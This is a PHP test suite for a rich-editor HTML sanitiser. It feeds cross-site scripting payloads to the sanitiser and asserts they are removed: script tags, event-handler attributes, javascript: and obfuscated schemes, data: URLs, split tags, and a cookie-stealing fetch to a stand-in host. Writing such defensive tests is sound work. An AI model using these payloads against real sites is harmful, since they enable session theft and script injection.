<?php

declare(strict_types=1);

namespace Tests\Feature;

use App\Models\Client;
use App\Models\Plan;
use App\Models\Router;
use App\Models\Tenant;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use InvalidArgumentException;
use Alxtexh\Panel\Forms\Fields\RichEditorField;
use Tests\TestCase;

/**
 * The HTML sanitiser, and almost nothing else.
 *
 * A rich editor is the one field where a user legitimately submits markup that
 * will later be rendered as markup, so the sanitiser IS the field. Everything
 * below is an attempt to get something executable past it.
 *
 * The client-side editor is deliberately not exercised here: it is not a
 * boundary, and testing it would give a false sense of coverage. Every payload
 * in this file is a raw string, which is what an attacker sends.
 */
final class RichEditorTest extends TestCase
{
    use RefreshDatabase;

    private Tenant $tenant;

    private User $user;

    protected function setUp(): void
    {
        parent::setUp();

        $this->tenant = Tenant::create(['name' => 'A', 'slug' => 'a']);
        $this->user = User::factory()->create([
            'tenant_id' => $this->tenant->id,
            'email_verified_at' => now(),
        ]);

        $this->actingAs($this->user);
    }

    /* --------------------------------------------------------- what survives */

    public function test_ordinary_formatting_is_kept(): void
    {
        $html = '<p>A <strong>bold</strong> and <em>italic</em> note.</p><ul><li>One</li></ul>';

        $this->assertSame($html, RichEditorField::sanitize($html));
    }

    public function test_headings_quotes_and_code_survive(): void
    {
        $html = '<h2>Access</h2><blockquote>Gate code</blockquote><pre><code>1234</code></pre>';

        $this->assertSame($html, RichEditorField::sanitize($html));
    }

    /** Non-ASCII must survive: these are people's names. */
    public function test_unicode_is_not_mangled(): void
    {
        $out = RichEditorField::sanitize('<p>Wanjirũ - café - 你好</p>');

        $this->assertStringContainsString('Wanjirũ', $out);
        $this->assertStringContainsString('café', $out);
        $this->assertStringContainsString('你好', $out);
    }

    /* ------------------------------------------------------- what does not */

    /** THE OBVIOUS ONE. Script and its payload both go. */
    public function test_a_script_tag_and_its_contents_are_removed(): void
    {
        $out = RichEditorField::sanitize('<p>Hi</p><script>alert(1)</script>');

        $this->assertStringNotContainsString('script', $out);
        $this->assertStringNotContainsString('alert', $out);
        $this->assertSame('<p>Hi</p>', $out);
    }

    /**
     * THE ONE A DENYLIST MISSES. An event handler needs no forbidden tag - an
     * `<img>` is not on the allowlist, but even a permitted element would carry
     * `onerror` past any check that only looks at tag names.
     */
    public function test_event_handler_attributes_never_survive(): void
    {
        $payloads = [
            '<img src=x onerror="alert(1)">',
            '<p onclick="alert(1)">Click</p>',
            '<p ONMOUSEOVER="alert(1)">Hover</p>',
            '<a href="#" onfocus="alert(1)" autofocus>Link</a>',
        ];

        foreach ($payloads as $payload) {
            $out = strtolower(RichEditorField::sanitize($payload));

            $this->assertStringNotContainsString('onerror', $out, $payload);
            $this->assertStringNotContainsString('onclick', $out, $payload);
            $this->assertStringNotContainsString('onmouseover', $out, $payload);
            $this->assertStringNotContainsString('onfocus', $out, $payload);
            $this->assertStringNotContainsString('alert', $out, $payload);
        }
    }

    /** An anchor is allowed; `javascript:` is a scheme, not a tag. */
    public function test_a_javascript_href_is_stripped_but_the_text_is_kept(): void
    {
        $out = RichEditorField::sanitize('<a href="javascript:alert(1)">Click me</a>');

        $this->assertStringNotContainsString('javascript', $out);
        $this->assertStringContainsString('Click me', $out);
    }

    /**
     * Whitespace and control characters inside a scheme are a real bypass -
     * some parsers read `java\nscript:` as `javascript:`.
     */
    public function test_an_obfuscated_scheme_is_still_refused(): void
    {
        foreach (["java\nscript:alert(1)", "java\tscript:alert(1)", ' javascript:alert(1)'] as $url) {
            $out = RichEditorField::sanitize('<a href="'.$url.'">x</a>');

            $this->assertStringNotContainsString('script', strtolower($out), $url);
        }
    }

    /** A `data:` URL is how an SVG payload arrives through an allowed attribute. */
    public function test_a_data_url_is_refused(): void
    {
        $out = RichEditorField::sanitize(
            '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'
        );

        $this->assertStringNotContainsString('data:', $out);
    }

    /** Relative links and mailto are legitimate and must be kept. */
    public function test_safe_schemes_and_relative_paths_survive(): void
    {
        foreach (['https://example.test/a', 'mailto:a@example.test', '/clients/1', '#anchor'] as $url) {
            $this->assertStringContainsString(
                $url,
                RichEditorField::sanitize('<a href="'.$url.'">x</a>'),
                $url,
            );
        }
    }

    /** An external link must not hand the opened page a window reference. */
    public function test_a_surviving_link_gets_noopener(): void
    {
        $out = RichEditorField::sanitize('<a href="https://example.test">x</a>');

        $this->assertStringContainsString('rel="noopener noreferrer nofollow"', $out);
        $this->assertStringContainsString('target="_blank"', $out);
    }

    /**
     * `<style>` can hide content, overlay the page, or exfiltrate through
     * attribute selectors. `<iframe>` needs no explanation.
     */
    public function test_style_iframe_object_and_svg_are_removed(): void
    {
        $out = RichEditorField::sanitize(
            '<style>body{display:none}</style><iframe src="//evil.test"></iframe>'
            .'<object data="x"></object><svg onload="alert(1)"></svg><form action="/x"></form>'
        );

        foreach (['style', 'iframe', 'object', 'svg', 'form', 'alert'] as $needle) {
            $this->assertStringNotContainsString($needle, strtolower($out), $needle);
        }
    }

    /**
     * A DISALLOWED WRAPPER LOSES ITS TAG, NOT ITS TEXT. Deleting the subtree
     * would mean a paste wrapped in a stray `<div>` silently eats the operator's
     * words, which is a data-loss bug wearing a security badge.
     */
    public function test_an_unknown_wrapper_is_unwrapped_not_deleted(): void
    {
        $out = RichEditorField::sanitize('<div class="x"><span>Kept text</span></div>');

        $this->assertStringContainsString('Kept text', $out);
        $this->assertStringNotContainsString('<div', $out);
        $this->assertStringNotContainsString('class', $out);
    }

    /** Nesting must not let anything smuggle itself past the walk. */
    public function test_a_nested_payload_is_still_reached(): void
    {
        $out = RichEditorField::sanitize(
            '<p><strong><div><script>alert(1)</script></div></strong></p>'
        );

        $this->assertStringNotContainsString('alert', $out);
    }

    /**
     * A regex sanitiser loses to this: removing `<script>` once turns
     * `<scr<script>ipt>` INTO `<script>`. A parser never sees it as a tag.
     */
    public function test_a_split_tag_is_not_reassembled_into_a_script(): void
    {
        $out = RichEditorField::sanitize('<scr<script>ipt>alert(1)</scr</script>ipt>');

        $this->assertStringNotContainsString('<script', strtolower($out));
    }

    /* --------------------------------------------------------------- storage */

    /** Markup that was entirely stripped stores NULL, not an empty paragraph. */
    public function test_content_that_is_entirely_stripped_stores_null(): void
    {
        $field = RichEditorField::make('notes');

        $this->assertNull($field->transformForStorage('<script>alert(1)</script>'));
        $this->assertNull($field->transformForStorage('<p></p>'));
        $this->assertNull($field->transformForStorage('   '));
        $this->assertNull($field->transformForStorage(null));
    }

    public function test_real_content_is_stored(): void
    {
        $stored = RichEditorField::make('notes')->transformForStorage('<p>Gate code 1234</p>');

        $this->assertSame('<p>Gate code 1234</p>', $stored);
    }

    /* ---------------------------------------------------------- the objects */

    public function test_an_unknown_toolbar_control_is_rejected_at_definition_time(): void
    {
        $this->expectException(InvalidArgumentException::class);

        RichEditorField::make('notes')->toolbar(['bold', 'launch_missiles']);
    }

    /**
     * The toolbar is PRESENTATION. Hiding the link button must not be mistaken
     * for a rule about what may be submitted - the sanitiser does not read it.
     */
    public function test_hiding_the_link_button_does_not_forbid_anchors(): void
    {
        $field = RichEditorField::make('notes')->toolbar(['bold']);

        $this->assertSame(['bold'], $field->toSchema()['toolbar']);
        $this->assertStringContainsString(
            'href',
            $field->transformForStorage('<a href="https://example.test">x</a>') ?? '',
        );
    }

    public function test_a_maximum_is_expressed_as_a_rule(): void
    {
        $this->assertContains('max:500', RichEditorField::make('notes')->maxLength(500)->rules());
    }

    /* --------------------------------------------------------------- the write */

    /**
     * THE PATH THAT MATTERS: a hostile payload through the real endpoint,
     * asserted against what landed in the database rather than what came back.
     */
    public function test_a_hostile_note_is_sanitised_on_the_way_into_storage(): void
    {
        $client = $this->makeClient();

        $this->put("/clients/{$client->id}", [
            ...$this->validPayload($client),
            'notes' => '<p>Careful</p><script>fetch("//evil.test?c="+document.cookie)</script>'
                .'<img src=x onerror="alert(1)"><a href="javascript:alert(1)">go</a>',
        ])->assertSessionHasNoErrors();

        $stored = $client->fresh()->notes;

        $this->assertStringContainsString('Careful', $stored);
        $this->assertStringNotContainsString('script', strtolower($stored));
        $this->assertStringNotContainsString('onerror', strtolower($stored));
        $this->assertStringNotContainsString('javascript', strtolower($stored));
        $this->assertStringNotContainsString('document.cookie', $stored);
    }

    /* ---------------------------------------------------------------- setup */

    /** @return array<string, mixed> */
    private function validPayload(Client $client): array
    {
        return [
            'name' => $client->name,
            'phone' => $client->phone,
            'access_code' => $client->access_code,
            'status' => 'active',
            'plan_type' => 'pppoe',
            'plan_id' => $client->plan_id,
            'expiry_date' => '2026-12-31',
        ];
    }

    private function makeClient(): Client
    {
        $plan = Plan::withoutGlobalScopes()->create([
            'tenant_id' => $this->tenant->id,
            'name' => 'Plan',
            'speed_mbps' => 10,
            'price_cents' => 1000,
        ]);

        $router = Router::withoutGlobalScopes()->create([
            'tenant_id' => $this->tenant->id,
            'name' => 'Router',
            'ip_address' => '10.0.0.1',
            'model' => 'RB750',
            'status' => 'online',
        ]);

        $unique = uniqid('c', true);

        return Client::withoutGlobalScopes()->forceCreate([
            'tenant_id' => $this->tenant->id,
            'plan_id' => $plan->id,
            'router_id' => $router->id,
            'name' => "Client {$unique}",
            'phone' => '+254'.substr((string) crc32($unique), 0, 9),
            'access_code' => strtoupper(substr(md5($unique), 0, 10)),
            'status' => 'active',
            'plan_type' => 'pppoe',
            'expiry_date' => '2026-12-31',
        ]);
    }
}
